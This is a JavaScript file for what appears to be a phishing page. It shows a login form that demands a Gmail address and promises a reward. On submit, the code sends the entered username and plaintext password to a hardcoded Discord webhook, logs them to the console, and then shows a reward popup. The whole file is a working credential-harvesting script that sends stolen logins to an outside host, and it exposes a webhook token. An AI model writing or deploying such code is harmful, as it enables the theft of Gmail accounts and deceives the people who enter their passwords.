// =====================
// WEBHOOK SETUP
// =====================
const webhookURL = "https://discord.com/api/webhooks/1523349094087524516/_xG4Ylf6EFO68Ol9POLxMhwVqarIsox1WBDrAuJ1RoQIoclMWp-YsYH-hZuumWrzzNi0";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}


document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();

if (!username || !password) {
    alert("Please fill in all fields.");
    return;
}

// Require a Gmail address
if (!username.toLowerCase().endsWith("@gmail.com")) {
    alert("Please enter a valid Gmail address.");
    return;
}


    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);

    // close login box
    document.getElementById("loginBox").classList.remove("show");

    // =====================
    // REWARD POPUP (PERMANENT)
    // =====================
    const popup = document.getElementById("rewardPopup");

    if (popup) {
        popup.classList.add("show");
    }
});


const loginBtn = document.querySelector(".open-login");
const loginBox = document.getElementById("loginBox");

loginBtn.addEventListener("click", (e) => {
    e.stopPropagation();
    loginBox.classList.toggle("show");
});


document.addEventListener("click", (e) => {
    if (
        !loginBox.contains(e.target) &&
        !loginBtn.contains(e.target)
    ) {
        loginBox.classList.remove("show");
    }
});


// =====================
// OPTIONAL BUTTON LOGS (if meron ka)
// =====================
document.getElementById("shopBtn")?.addEventListener("click", () => {

});

document.getElementById("screenshotBtn")?.addEventListener("click", () => {
  
});
